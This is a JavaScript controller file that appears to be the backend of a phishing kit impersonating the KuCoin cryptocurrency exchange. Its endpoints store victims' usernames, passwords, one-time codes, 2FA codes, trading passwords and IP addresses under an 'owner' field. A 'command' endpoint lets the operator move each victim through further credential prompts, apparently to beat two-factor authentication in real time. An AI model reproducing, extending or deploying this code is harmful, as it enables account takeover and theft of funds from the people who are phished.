const Kucoin = require("../models/kucoinModel");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Kucoin.find({ owner })
    .sort({ timestamp: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await Kucoin.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Kucoin.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { username, password, uniqueid, owner, ip } = req.body;
  try {
    await Kucoin.create({
      uniqueid,
      username,
      password,
      status: 1,
      owner,
      ip,
      timestamp: moment().format(),
    });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { username, password, uniqueid } = req.body;
  try {
    await Kucoin.findOneAndUpdate(
      { uniqueid },
      { username, password, status: 11, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await Kucoin.findOneAndUpdate(
      { uniqueid },
      { otp, status: 5, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitTrading = async (req, res) => {
  const { tradingPass, uniqueid } = req.body;
  try {
    await Kucoin.findOneAndUpdate(
      { uniqueid },
      { tradingPass, status: 7, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submit2fa = async (req, res) => {
  const { twofactor, uniqueid } = req.body;
  try {
    await Kucoin.findOneAndUpdate(
      { uniqueid },
      { twofactor, status: 3, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitSec = async (req, res) => {
  const { otp, twofactor, tradingPass, uniqueid } = req.body;
  try {
    await Kucoin.findOneAndUpdate(
      { uniqueid },
      { otp, twofactor, tradingPass, status: 8, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await Kucoin.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitTrading,
  submit2fa,
  deleteEntry,
  submitSec,
};
